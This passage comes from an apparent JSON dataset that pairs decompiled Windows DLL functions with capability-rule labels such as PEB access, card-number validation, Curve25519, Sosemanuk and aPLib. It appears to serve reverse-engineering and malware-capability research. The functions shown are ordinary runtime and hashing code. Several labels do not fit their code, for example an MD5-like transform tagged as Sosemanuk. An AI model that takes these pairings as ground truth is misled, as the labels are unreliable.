puVar1) = *puVar7;\n            *(arg3 + (-0x58 - arg1) + puVar1) = puVar7[1];\n            puVar2 = puVar7 + 2;\n            puVar7[-1] = 0;\n            *puVar7 = 0;\n            puVar7[1] = 0;\n            puVar7 = puVar1;\n        } while (puVar2 != arg2);\n    }\n    return puVar8;\n}\n",
        "token_count": 980
    },
    "18004a3e": {
        "rules": [
            "PEB access/35f28d23090149119036cdb16976bf66",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t * fcn.18004a3e0(uint64_t *arg1, uint64_t *arg2, uint64_t *arg3)\n\n{\n    uint64_t *puVar1;\n    uint64_t **ppuVar2;\n    uint64_t *puVar3;\n    uint64_t *arg1_00;\n    \n    if (arg1 != arg2) {\n        arg1_00 = arg3 + 4;\n        puVar3 = arg1 + 7;\n        do {\n            ppuVar2 = puVar3 + -7;\n            if (arg3 != ppuVar2) {\n                if (0xf < puVar3[-4]) {\n                    ppuVar2 = *ppuVar2;\n                }\n                fcn.180011120(arg3, ppuVar2, puVar3[-5]);\n            }\n            ppuVar2 = puVar3 + -3;\n            if (arg1_00 != ppuVar2) {\n                if (7 < *puVar3) {\n                    ppuVar2 = *ppuVar2;\n                }\n                fcn.180010d70(arg1_00, ppuVar2, puVar3[-1]);\n            }\n            *(arg1_00 + 4) = *(puVar3 + 1);\n            *(arg1_00 + 0x24) = *(puVar3 + 0xc);\n            if (arg1_00 + 5 != puVar3 + 2) {\n                fcn.180049f50(arg1_00 + 5, puVar3[2], puVar3[3]);\n            }\n            arg3 = arg3 + 0xc;\n            arg1_00 = arg1_00 + 0xc;\n            puVar1 = puVar3 + 5;\n            puVar3 = puVar3 + 0xc;\n        } while (puVar1 != arg2);\n    }\n    return arg3;\n}\n",
        "token_count": 424
    },
    "1800c61b": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint64_t fcn.1800c61b0(ulong arg1, ulong arg2, uint32_t *arg3, uint32_t *arg4)\n\n{\n    int64_t *piVar1;\n    ulong arg1_00;\n    int64_t iVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    \n    uVar7 = arg1;\n    uVar6 = *0x180123080 ^ *(uVar7 * 8 + 0x180129d10);\n    uVar3 = *0x180123080 & 0x3f;\n    uVar6 = uVar6 >> uVar3 | uVar6 << 0x40 - uVar3;\n    if (uVar6 != 0xffffffffffffffff) {\n        if (uVar6 != 0) {\n            return uVar6;\n        }\n        if (arg3 != arg4) {\n            do {\n                uVar6 = *arg3;\n                iVar5 = *(uVar6 * 8 + 0x180129c70);\n                if (iVar5 == 0) {\n                    arg1_00 = *(uVar6 * 8 + 0x1800eda80);\n                    iVar5 = (**0x1800de448)(arg1_00, 0);\n                    if (iVar5 == 0) {\n                        iVar4 = (**0x1800de400)();\n                        if (((iVar4 == 0x57) && (iVar4 = fcn.1800c20a0(arg1_00, L\"api-ms-\", 7),  iVar4 != 0)) &&\n                           (iVar4 = fcn.1800c20a0(arg1_00, L\"ext-ms-\", 7),  iVar4 != 0)) {\n                            iVar5 = (**0x1800de448)(arg1_00, 0, 0);\n                        }\n                        else {\n                            iVar5 = 0;\n                        }\n                    }\n                    if (iVar5 != 0) {\n                        piVar1 = uVar6 * 8 + 0x180129c70;\n                        iVar2 = *piVar1;\n                        *piVar1 = iVar5;\n                        if (iVar2 != 0) {\n                            (**0x1800de2d0)(iVar5);\n                        }\n                        goto code_r0x0001800c62e2;\n                    }\n                    *(uVar6 * 8 + 0x180129c70) = 0xffffffffffffffff;\n                }\n                else if (iVar5 != -1) {\ncode_r0x0001800c62e2:\n                    if (iVar5 != 0) goto code_r0x0001800c62fd;\n                }\n                arg3 = arg3 + 1;\n            } while (arg3 != arg4);\n        }\n        iVar5 = 0;\ncode_r0x0001800c62fd:\n        if ((iVar5 != 0) && (uVar6 = (**0x1800de458)(iVar5, arg2),  uVar6 != 0)) {\n            uVar3 = 0x40 - (*0x180123080 & 0x3f) & 0x3f;\n            *(uVar7 * 8 + 0x180129d10) = (uVar6 >> uVar3 | uVar6 << 0x40 - uVar3) ^ *0x180123080;\n            return uVar6;\n        }\n        uVar3 = 0x40 - (*0x180123080 & 0x3f) & 0x3f;\n        *(uVar7 * 8 + 0x180129d10) = (0xffffffffffffffffU >> uVar3 | -1 << 0x40 - uVar3) ^ *0x180123080;\n    }\n    return 0;\n}\n",
        "token_count": 858
    },
    "1800c8e6": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nint64_t fcn.1800c8e60(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    uint *puVar5;\n    uint64_t arg1_00;\n    int64_t iStackX32;\n    \n    arg1_00 = arg1 & 0xffffffff;\n    iVar4 = fcn.1800ce8e4(arg1_00);\n    if (iVar4 == -1) {\n        puVar5 = fcn.1800ba53c(arg1_00);\n        *puVar5 = 9;\n    }\n    else {\n        iVar2 = (**0x1800de240)(iVar4, arg2, &iStackX32, arg3);\n        if (iVar2 == 0) {\n            uVar3 = (**0x1800de400)();\n            fcn.1800ba4cc(uVar3);\n        }\n        else if (iStackX32 != -1) {\n            puVar1 = *((arg1 >> 6) * 8 + 0x180129850) + 0x38 + (arg1 & 0x3f) * 0x48;\n            *puVar1 = *puVar1 & 0xfd;\n            return iStackX32;\n        }\n    }\n    return -1;\n}\n",
        "token_count": 312
    },
    "1800cbf4": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint64_t fcn.1800cbf4c(ulong noname_0, uint32_t *arg2, ulong noname_2, uint32_t *arg4)\n\n{\n    uint8_t uVar1;\n    uint64_t uVar2;\n    \n    fcn.1800bad60(*arg2);\n    uVar1 = *0x180123080 & 0x3f;\n    uVar2 = *0x180123080 ^ *0x180129f40;\n    fcn.1800badb4(*arg4);\n    return uVar2 >> uVar1 | uVar2 << 0x40 - uVar1;\n}\n",
        "token_count": 145
    },
    "1800ce5d": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid fcn.1800ce5d8(ulong arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x0001800ce5f8. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x1800de508)(*((arg1 >> 6) * 8 + 0x180129850) + (arg1 & 0x3f) * 0x48);\n    return;\n}\n",
        "token_count": 102
    },
    "1800ce6c": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid fcn.1800ce6c0(ulong arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x0001800ce6e0. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x1800de500)(*((arg1 >> 6) * 8 + 0x180129850) + (arg1 & 0x3f) * 0x48);\n    return;\n}\n",
        "token_count": 102
    },
    "1800ceba": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nint64_t fcn.1800cebac(uint8_t *arg1, ulong arg2, ulong *arg3)\n\n{\n    uint *puVar1;\n    uint8_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uint8_t uVar5;\n    \n    if (arg1 != NULL) {\n        if (arg2 != 0) {\n            if ((arg2 & 0xffffff80) == 0) {\n                *arg1 = arg2;\n                return 1;\n            }\n            if ((arg2 & 0xfffff800) == 0) {\n                iVar3 = 1;\n                uVar5 = 0xc0;\n                iVar4 = iVar3;\n            }\n            else if ((arg2 & 0xffff0000) == 0) {\n                if (arg2 - 0xd800 < 0x800) {\ncode_r0x0001800cec47:\n                    *arg3 = 0;\n                    puVar1 = fcn.1800ba53c(arg1);\n                    *puVar1 = 0x2a;\n                    return -1;\n                }\n                iVar3 = 2;\n                uVar5 = 0xe0;\n                iVar4 = iVar3;\n            }\n            else {\n                if (((arg2 & 0xffe00000) != 0) || (0x10ffff < arg2)) goto code_r0x0001800cec47;\n                iVar3 = 3;\n                uVar5 = 0xf0;\n                iVar4 = iVar3;\n            }\n            do {\n                uVar2 = arg2;\n                arg2._0_4_ = arg2 >> 6;\n                arg1[iVar3] = uVar2 & 0x3f | 0x80;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n            *arg1 = arg2 | uVar5;\n            *arg3 = 0;\n            return iVar4 + 1;\n        }\n        *arg1 = arg2;\n    }\n    *arg3 = 0;\n    return 1;\n}\n",
        "token_count": 462
    },
    "1800654e": {
        "rules": [
            "encrypt data using Sosemanuk/d9cb91cf002a4780a153bbbb736437ff"
        ],
        "decompiled_code": "\nvoid fcn.1800654e0(int64_t arg1, int32_t *arg2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    uint32_t uVar22;\n    \n    uVar20 = *(arg1 + 0x54);\n    uVar19 = *(arg1 + 0x58);\n    uVar18 = *(arg1 + 0x5c);\n    iVar1 = *arg2;\n    iVar2 = arg2[5];\n    iVar3 = arg2[1];\n    uVar17 = iVar1 + -0x28955b88 + ((uVar18 ^ uVar19) & uVar20 ^ uVar18) + *(arg1 + 0x50);\n    uVar17 = (uVar17 * 0x80 | uVar17 >> 0x19) + uVar20;\n    iVar4 = arg2[2];\n    uVar18 = uVar18 + 0xe8c7b756 + ((uVar19 ^ uVar20) & uVar17 ^ uVar19) + iVar3;\n    uVar18 = (uVar18 * 0x1000 | uVar18 >> 0x14) + uVar17;\n    iVar5 = arg2[3];\n    uVar19 = uVar19 + 0x242070db + ((uVar20 ^ uVar17) & uVar18 ^ uVar20) + iVar4;\n    uVar19 = (uVar19 >> 0xf | uVar19 * 0x20000) + uVar18;\n    iVar6 = arg2[4];\n    uVar20 = uVar20 + 0xc1bdceee + ((uVar18 ^ uVar17) & uVar19 ^ uVar17) + iVar5;\n    uVar21 = (uVar20 >> 10 | uVar20 * 0x400000) + uVar19;\n    uVar20 = uVar17 + 0xf57c0faf + ((uVar18 ^ uVar19) & uVar21 ^ uVar18) + iVar6;\n    iVar7 = arg2[6];\n    uVar17 = (uVar20 * 0x80 | uVar20 >> 0x19) + uVar21;\n    uVar20 = uVar18 + 0x4787c62a + ((uVar19 ^ uVar21) & uVar17 ^ uVar19) + iVar2;\n    uVar20 = (uVar20 * 0x1000 | uVar20 >> 0x14) + uVar17;\n    uVar19 = uVar19 + 0xa8304613 + ((uVar21 ^ uVar17) & uVar20 ^ uVar21) + iVar7;\n    uVar19 = (uVar19 >> 0xf | uVar19 * 0x20000) + uVar20;\n    iVar8 = arg2[7];\n    iVar9 = arg2[8];\n    iVar10 = arg2[10];\n    iVar11 = arg2[0xc];\n    iVar12 = arg2[0xd];\n    iVar13 = arg2[0xe];\n    iVar14 = arg2[9];\n    uVar18 = uVar21 + 0xfd469501 + ((uVar20 ^ uVar17) & uVar19 ^ uVar17) + iVar8;\n    uVar18 = (uVar18 >> 10 | uVar18 * 0x400000) + uVar19;\n    uVar17 = uVar17 + 0x698098d8 + ((uVar20 ^ uVar19) & uVar18 ^ uVar20) + iVar9;\n    uVar21 = (uVar17 * 0x80 | uVar17 >> 0x19) + uVar18;\n    uVar20 = uVar20 + 0x8b44f7af + ((uVar19 ^ uVar18) & uVar21 ^ uVar19) + iVar14;\n    iVar15 = arg2[0xb];\n    uVar17 = (uVar20 * 0x1000 | uVar20 >> 0x14) + uVar21;\n    uVar20 = (uVar19 - 0xa44f) + ((uVar18 ^ uVar21) & uVar17 ^ uVar18) + iVar10;\n    uVar20 = (uVar20 >> 0xf | uVar20 * 0x20000) + uVar17;\n    uVar19 = uVar18 + 0x895cd7be + ((uVar17 ^ uVar21) & uVar20 ^ uVar21) + iVar15;\n    uVar19 = (uVar19 >> 10 | uVar19 * 0x400000) + uVar20;\n    uVar18 = uVar21 + 0x6b901122 + ((uVar17 ^ uVar20) & uVar19 ^ uVar17) + iVar11;\n    uVar18 = (uVar18 * 0x80 | uVar18 >> 0x19) + uVar19;\n    uVar17 = ((uVar20 ^ uVar19) & uVar18 ^ uVar20) + 0xfd987193 + iVar12 + uVar17;\n    uVar17 = (uVar17 * 0x1000 | uVar17 >> 0x14) + uVar18;\n    uVar20 = uVar20 + 0xa679438e + ((uVar19 ^ uVar18) & uVar17 ^ uVar19) + iVar13;\n    iVar16 = arg2[0xf];\n    uVar21 = (uVar20 >> 0xf | uVar20 * 0x20000) + uVar17;\n    uVar19 = ((uVar17 ^ uVar18) & uVar21 ^ uVar18) + 0x49b40821 + iVar16 + uVar19;\n    uVar20 = (uVar19 >> 10 | uVar19 * 0x400000) + uVar21;\n    uVar18 = uVar18 + ((uVar21 ^ uVar20) & uVar17 ^ uVar21) + 0xf61e2562 + iVar3;\n    uVar19 = (uVar18 * 0x20 | uVar18 >> 0x1b) + uVar20;\n    uVar17 = uVar17 + ((uVar20 ^ uVar19) & uVar21 ^ uVar20) + 0xc040b340 + iVar7;\n    uVar18 = (uVar17 * 0x200 | uVar17 >> 0x17) + uVar19;\n    uVar21 = uVar21 + ((uVar18 ^ uVar19) & uVar20 ^ uVar19) + 0x265e5a51 + iVar15;\n    uVar17 = (uVar21 * 0x4000 | uVar21 >> 0x12) + uVar18;\n    uVar20 = uVar20 + 0xe9b6c7aa + ((uVar18 ^ uVar17) & uVar19 ^ uVar18) + iVar1;\n    uVar21 = (uVar20 >> 0xc | uVar20 * 0x100000) + uVar17;\n    uVar20 = uVar19 + 0xd62f105d + ((uVar17 ^ uVar21) & uVar18 ^ uVar17) + iVar2;\n    uVar20 = (uVar20 * 0x20 | uVar20 >> 0x1b) + uVar21;\n    uVar19 = uVar18 + 0x2441453 + ((uVar21 ^ uVar20) & uVar17 ^ uVar21) + iVar10;\n    uVar19 = (uVar19 * 0x200 | uVar19 >> 0x17) + uVar20;\n    uVar18 = uVar17 + 0xd8a1e681 + ((uVar19 ^ uVar20) & uVar21 ^ uVar20) + iVar16;\n    uVar18 = (uVar18 * 0x4000 | uVar18 >> 0x12) + uVar19;\n    uVar17 = uVar21 + 0xe7d3fbc8 + ((uVar19 ^ uVar18) & uVar20 ^ uVar19) + iVar6;\n    uVar17 = (uVar17 >> 0xc | uVar17 * 0x100000) + uVar18;\n    uVar20 = uVar20 + 0x21e1cde6 + ((uVar18 ^ uVar17) & uVar19 ^ uVar18) + iVar14;\n    uVar21 = (uVar20 * 0x20 | uVar20 >> 0x1b) + uVar17;\n    uVar20 = uVar19 + 0xc33707d6 + ((uVar17 ^ uVar21) & uVar18 ^ uVar17) + iVar13;\n    uVar20 = (uVar20 * 0x200 | uVar20 >> 0x17) + uVar21;\n    uVar19 = uVar18 + 0xf4d50d87 + ((uVar20 ^ uVar21) & uVar17 ^ uVar21) + iVar5;\n    uVar19 = (uVar19 * 0x4000 | uVar19 >> 0x12) + uVar20;\n    uVar18 = uVar17 + 0x455a14ed + ((uVar20 ^ uVar19) & uVar21 ^ uVar20) + iVar9;\n    uVar22 = (uVar18 >> 0xc | uVar18 * 0x100000) + uVar19;\n    uVar18 = uVar21 + 0xa9e3e905 + ((uVar19 ^ uVar22) & uVar20 ^ uVar19) + iVar12;\n    uVar18 = (uVar18 * 0x20 | uVar18 >> 0x1b) + uVar22;\n    uVar20 = uVar20 + 0xfcefa3f8 + ((uVar22 ^ uVar18) & uVar19 ^ uVar22) + iVar4;\n    uVar17 = (uVar20 * 0x200 | uVar20 >> 0x17) + uVar18;\n    uVar20 = uVar19 + 0x676f02d9 + ((uVar17 ^ uVar18) & uVar22 ^ uVar18) + iVar8;\n    uVar21 = (uVar20 * 0x4000 | uVar20 >> 0x12) + uVar17;\n    uVar20 = uVar22 + 0x8d2a4c8a + ((uVar17 ^ uVar21) & uVar18 ^ uVar17) + iVar11;\n    uVar20 = (uVar20 >> 0xc | uVar20 * 0x100000) + uVar21;\n    uVar18 = uVar18 + ((uVar17 ^ uVar21 ^ uVar20) - 0x5c6be) + iVar2;\n    uVar19 = (uVar18 * 0x10 | uVar18 >> 0x1c) + uVar20;\n    uVar17 = uVar17 + (uVar21 ^ uVar20 ^ uVar19) + 0x8771f681 + iVar9;\n    uVar18 = (uVar17 * 0x800 | uVar17 >> 0x15) + uVar19;\n    uVar21 = uVar21 + (uVar18 ^ uVar20 ^ uVar19) + 0x6d9d6122 + iVar15;\n    uVar17 = (uVar21 * 0x10000 | uVar21 >> 0x10) + uVar18;\n    uVar20 = uVar20 + 0xfde5380c + (uVar18 ^ uVar17 ^ uVar19) + iVar13;\n    uVar21 = (uVar20 >> 9 | uVar20 * 0x800000) + uVar17;\n    uVar20 = uVar19 + 0xa4beea44 + (uVar18 ^ uVar17 ^ uVar21) + iVar3;\n    uVar20 = (uVar20 * 0x10 | uVar20 >> 0x1c) + uVar21;\n    uVar19 = uVar18 + 0x4bdecfa9 + (uVar17 ^ uVar21 ^ uVar20) + iVar6;\n    uVar19 = (uVar19 * 0x800 | uVar19 >> 0x15) + uVar20;\n    uVar18 = uVar17 + 0xf6bb4b60 + (uVar19 ^ uVar21 ^ uVar20) + iVar8;\n    uVar17 = (uVar18 * 0x10000 | uVar18 >> 0x10) + uVar19;\n    uVar18 = uVar21 + 0xbebfbc70 + (uVar19 ^ uVar17 ^ uVar20) + iVar10;\n    uVar21 = (uVar18 >> 9 | uVar18 * 0x800000) + uVar17;\n    uVar20 = uVar20 + 0x289b7ec6 + (uVar19 ^ uVar17 ^ uVar21) + iVar12;\n    uVar22 = (uVar20 * 0x10 | uVar20 >> 0x1c) + uVar21;\n    uVar19 = uVar19 + (uVar17 ^ uVar21 ^ uVar22) + 0xeaa127fa + iVar1;\n    uVar18 = (uVar19 * 0x800 | uVar19 >> 0x15) + uVar22;\n    uVar17 = uVar17 + (uVar18 ^ uVar21 ^ uVar22) + 0xd4ef3085 + iVar5;\n    uVar17 = (uVar17 * 0x10000 | uVar17 >> 0x10) + uVar18;\n    uVar20 = uVar21 + 0x4881d05 + (uVar18 ^ uVar17 ^ uVar22) + iVar7;\n    uVar19 = (uVar20 >> 9 | uVar20 * 0x800000) + uVar17;\n    uVar22 = (uVar18 ^ uVar17 ^ uVar19) + iVar14 + -0x262b2fc7 + uVar22;\n    uVar21 = (uVar22 * 0x10 | uVar22 >> 0x1c) + uVar19;\n    uVar20 = uVar18 + 0xe6db99e5 + (uVar17 ^ uVar19 ^ uVar21) + iVar11;\n    uVar20 = (uVar20 * 0x800 | uVar20 >> 0x15) + uVar21;\n    uVar18 = uVar17 + 0x1fa27cf8 + (uVar20 ^ uVar19 ^ uVar21) + iVar16;\n    uVar18 = (uVar18 * 0x10000 | uVar18 >> 0x10) + uVar20;\n    uVar19 = uVar19 + 0xc4ac5665 + (uVar20 ^ uVar18 ^ uVar21) + iVar4;\n    uVar17 = (uVar19 >> 9 | uVar19 * 0x800000) + uVar18;\n    uVar19 = uVar21 + 0xf4292244 + ((~uVar20 | uVar17) ^ uVar18) + iVar1;\n    uVar19 = (uVar19 * 0x40 | uVar19 >> 0x1a) + uVar17;\n    uVar20 = uVar20 + 0x432aff97 + ((~uVar18 | uVar19) ^ uVar17) + iVar8;\n    uVar21 = (uVar20 * 0x400 | uVar20 >> 0x16) + uVar19;\n    uVar20 = uVar18 + 0xab9423a7 + ((~uVar17 | uVar21) ^ uVar19) + iVar13;\n    uVar20 = (uVar20 * 0x8000 | uVar20 >> 0x11) + uVar21;\n    uVar18 = uVar17 + 0xfc93a039 + ((~uVar19 | uVar20) ^ uVar21) + iVar2;\n    uVar18 = (uVar18 >> 0xb | uVar18 * 0x200000) + uVar20;\n    uVar19 = uVar19 + 0x655b59c3 + ((~uVar21 | uVar18) ^ uVar20) + iVar11;\n    uVar17 = (uVar19 * 0x40 | uVar19 >> 0x1a) + uVar18;\n    uVar19 = uVar21 + 0x8f0ccc92 + ((~uVar20 | uVar17) ^ uVar18) + iVar5;\n    uVar19 = (uVar19 * 0x400 | uVar19 >> 0x16) + uVar17;\n    uVar20 = (uVar20 - 0x100b83) + ((~uVar18 | uVar19) ^ uVar17) + iVar10;\n    uVar22 = (uVar20 * 0x8000 | uVar20 >> 0x11) + uVar19;\n    uVar20 = uVar18 + 0x85845dd1 + ((~uVar17 | uVar22) ^ uVar19) + iVar3;\n    uVar20 = (uVar20 >> 0xb | uVar20 * 0x200000) + uVar22;\n    uVar18 = uVar17 + 0x6fa87e4f + ((~uVar19 | uVar20) ^ uVar22) + iVar9;\n    uVar18 = (uVar18 * 0x40 | uVar18 >> 0x1a) + uVar20;\n    uVar19 = ((~uVar22 | uVar18) ^ uVar20) + 0xfe2ce6e0 + iVar16 + uVar19;\n    uVar21 = (uVar19 * 0x400 | uVar19 >> 0x16) + uVar18;\n    uVar19 = uVar22 + 0xa3014314 + ((~uVar20 | uVar21) ^ uVar18) + iVar7;\n    uVar19 = (uVar19 * 0x8000 | uVar19 >> 0x11) + uVar21;\n    uVar20 = uVar20 + 0x4e0811a1 + ((~uVar18 | uVar19) ^ uVar21) + iVar12;\n    uVar22 = (uVar20 >> 0xb | uVar20 * 0x200000) + uVar19;\n    uVar18 = uVar18 + ((~uVar21 | uVar22) ^ uVar19) + 0xf7537e82 + iVar6;\n    uVar17 = (uVar18 * 0x40 | uVar18 >> 0x1a) + uVar22;\n    uVar20 = uVar21 + 0xbd3af235 + ((~uVar19 | uVar17) ^ uVar22) + iVar15;\n    uVar18 = (uVar20 * 0x400 | uVar20 >> 0x16) + uVar17;\n    *(arg1 + 0x50) = *(arg1 + 0x50) + uVar17;\n    uVar19 = ((~uVar22 | uVar18) ^ uVar17) + 0x2ad7d2bb + iVar4 + uVar19;\n    uVar19 = (uVar19 * 0x8000 | uVar19 >> 0x11) + uVar18;\n    *(arg1 + 0x58) = *(arg1 + 0x58) + uVar19;\n    uVar20 = uVar22 + 0xeb86d391 + ((~uVar17 | uVar19) ^ uVar18) + iVar14;\n    *(arg1 + 0x5c) = *(arg1 + 0x5c) + uVar18;\n    *(arg1 + 0x54) = (uVar20 >> 0xb | uVar20 * 0x200000) + *(arg1 + 0x54) + uVar19;\n    return;\n}\n",
        "token_count": 4744
    },
    "18007b76": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nvoid fcn.18007b76c(ulong noname_0, ushort *arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    char cVar2;\n    char cVar3;\n    char cVar4;\n    int16_t iVar5;\n    int16_t iVar6;\n    ulong uVar7;\n    int64_t iVar8;\n    ulong uVar9;\n    ushort *puVar10;\n    ulong *puVar11;\n    uint64_t uVar12;\n    int16_t *piVar13;\n    ulong *****pppppuVar14;\n    int32_t iVar15;\n    uint64_t uVar16;\n    ushort *puVar17;\n    int32_t iVar18;\n    int32_t iVar19;\n    uint64_t uVar20;\n    int64_t in_stack_00000028;\n    int32_t *in_stack_00000030;\n    uchar auStack312 [48];\n    char cStack264;\n    char cStack263;\n    int32_t iStack260;\n    uint32_t uStack256;\n    int32_t iStack252;\n    int32_t *piStack248;\n    ulong *****pppppuStack240;\n    int64_t iStack232;\n    ulong uStack224;\n    int64_t iStack216;\n    ushort *puStack208;\n    ulong uStack200;\n    ushort uStack192;\n    unkbyte6 Stack190;\n    uint64_t uStack176;\n    uint64_t uStack168;\n    ulong *****apppppuStack160 [2];\n    int64_t iStack144;\n    uint64_t uStack136;\n    int16_t aiStack128 [28];\n    int16_t aiStack72 [4];\n    uint64_t uStack64;\n    \n    uStack200 = 0xfffffffffffffffe;\n    uStack64 = *0x180123080 ^ auStack312;\n    piStack248 = in_stack_00000030;\n    iVar8 = *(*(in_stack_00000028 + 0x40) + 8);\n    iStack216 = iVar8;\n    puStack208 = arg2;\n    (**0x1800de8f0)(iVar8);\n    uVar7 = fcn.180077b3c(&uStack224);\n    iVar18 = 0;\n    uStack224 = uVar7;\n    if ((iVar8 != 0) && (iVar8 = (**0x1800de8f0)(iVar8),  iVar8 != 0)) {\n        (**0x1800de8f0)(iVar8, 1);\n    }\n    (**0x1800de8f0)(uVar7, apppppuStack160);\n    iVar8 = *(*(in_stack_00000028 + 0x40) + 8);\n    iStack232 = iVar8;\n    (**0x1800de8f0)(iVar8);\n    uVar9 = fcn.180076930(&pppppuStack240);\n    if ((iVar8 != 0) && (iVar8 = (**0x1800de8f0)(iVar8),  iVar8 != 0)) {\n        (**0x1800de8f0)(iVar8, 1);\n    }\n    (**0x1800de8f0)(uVar9, 0x1800e2ad8);\n    cStack263 = '\\0';\n    cVar2 = fcn.1800890e8(arg3, arg4);\n    if (cVar2 == '\\0') {\n        iVar5 = fcn.1800783e4(arg3);\n        if (iVar5 == aiStack128[23]) {\n            *arg2 = 0x2b;\n        }\n        else {\n            iVar5 = fcn.1800783e4(arg3);\n            if (iVar5 != aiStack128[22]) goto code_r0x00018007b8fa;\n            *arg2 = 0x2d;\n        }\n        arg2 = arg2 + 1;\n        fcn.18007f190(arg3);\n    }\ncode_r0x00018007b8fa:\n    *arg2 = 0x7830;\n    arg2 = arg2 + 1;\n    cStack264 = '\\0';\n    uVar16 = 0;\n    uStack256 = 0;\n    iStack260 = 0;\n    cVar2 = fcn.1800890e8(arg3, arg4);\n    if ((cVar2 == '\\0') && (iVar5 = fcn.1800783e4(arg3),  iVar5 == aiStack128[0])) {\n        fcn.18007f190(arg3);\n        cVar2 = fcn.1800890e8(arg3, arg4);\n        if ((cVar2 == '\\0') &&\n           ((iVar5 = fcn.1800783e4(arg3),  iVar5 == aiStack128[25] ||\n            (iVar5 = fcn.1800783e4(arg3),  iVar5 == aiStack128[24])))) {\n            fcn.18007f190(arg3);\n        }\n        else {\n            cStack264 = '\\x01';\n        }\n    }\n    iVar15 = 0x24;\n    if (*piStack248 == 1000000000) {\n        iVar15 = 0x300;\n    }\n    pppppuStack240 = apppppuStack160;\n    if (0xf < uStack136) {\n        pppppuStack240 = apppppuStack160[0];\n    }\n    iStack252 = iVar15;\n    if (*pppppuStack240 - 1U < 0x7e) {\n        if (iStack144 == 0) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (**0x1800de8f0)(uVar7);\n        }\n        uVar20 = 0xf;\n        uStack168 = 0xf;\n        uStack176 = 1;\n        uStack192 = 0;\n        cVar2 = fcn.1800890e8(arg3, arg4);\n        puVar17 = CONCAT62(Stack190, uStack192);\n        pppppuVar14 = pppppuStack240;\n        if (cVar2 == '\\0') {\n            do {\n                iVar6 = fcn.1800783e4(arg3);\n                piVar13 = aiStack128;\n                do {\n                    if (*piVar13 == iVar6) break;\n                    piVar13 = piVar13 + 1;\n                } while (piVar13 != aiStack72);\n                uVar12 = piVar13 - aiStack128 >> 1;\n                if (uVar12 < 0x16) {\n                    cStack264 = '\\x01';\n                    if (uStack256 < iStack252) {\n                        if ((uVar12 != 0) || (uStack256 != 0)) {\n                            *arg2 = *(uVar12 + 0x1800e2ad8);\n                            arg2 = arg2 + 1;\n                            uStack256 = uStack256 + 1;\n                        }\n                    }\n                    else {\n                        iStack260 = iStack260 + 1;\n                    }\n                    puVar10 = &uStack192;\n                    if (0xf < uVar20) {\n                        puVar10 = puVar17;\n                    }\n                    if (*(puVar10 + uVar16) != '\\x7f') {\n                        puVar10 = &uStack192;\n                        if (0xf < uVar20) {\n                            puVar10 = puVar17;\n                        }\n                        *(puVar10 + uVar16) = *(puVar10 + uVar16) + '\\x01';\n                        goto code_r0x00018007bae9;\n                    }\n                }\n                else {\n                    puVar10 = &uStack192;\n                    if (0xf < uVar20) {\n                        puVar10 = puVar17;\n                    }\n                    if (((*(puVar10 + uVar16) == '\\0') || (iVar5 == 0)) ||\n                       (iVar6 = fcn.1800783e4(arg3),  iVar6 != iVar5)) break;\n                    if (uStack176 < uVar20) {\n                        puVar10 = &uStack192;\n                        if (0xf < uVar20) {\n                            puVar10 = puVar17;\n                        }\n                        puVar10 = puVar10 + uStack176;\n                        uStack176 = uStack176 + 1;\n                        *puVar10 = 0;\n                    }\n                    else {\n                        fcn.180013eb0(&uStack192, 1);\n                    }\n                    uVar16 = uVar16 + 1;\ncode_r0x00018007bae9:\n                    puVar17 = CONCAT62(Stack190, uStack192);\n                    uVar20 = uStack168;\n                }\n                fcn.18007f190(arg3);\n                cVar2 = fcn.1800890e8(arg3, arg4);\n            } while (cVar2 == '\\0');\n            pppppuVar14 = pppppuStack240;\n            if (uVar16 == 0) goto code_r0x00018007bb38;\n            puVar10 = &uStack192;\n            if (0xf < uVar20) {\n                puVar10 = puVar17;\n            }\n            if ('\\0' < *(puVar10 + uVar16)) {\n                uVar16 = uVar16 + 1;\n                goto code_r0x00018007bb38;\n            }\ncode_r0x00018007bb7b:\n            cStack263 = '\\x01';\n        }\n        else {\ncode_r0x00018007bb38:\n            while ((uVar16 != 0 && (cVar2 = *pppppuVar14,  cVar2 != '\\x7f'))) {\n                uVar16 = uVar16 - 1;\n                if (uVar16 != 0) {\n                    puVar10 = &uStack192;\n                    if (0xf < uVar20) {\n                        puVar10 = puVar17;\n                    }\n                    if (cVar2 != *(puVar10 + uVar16)) goto code_r0x00018007bb7b;\n                }\n                if (uVar16 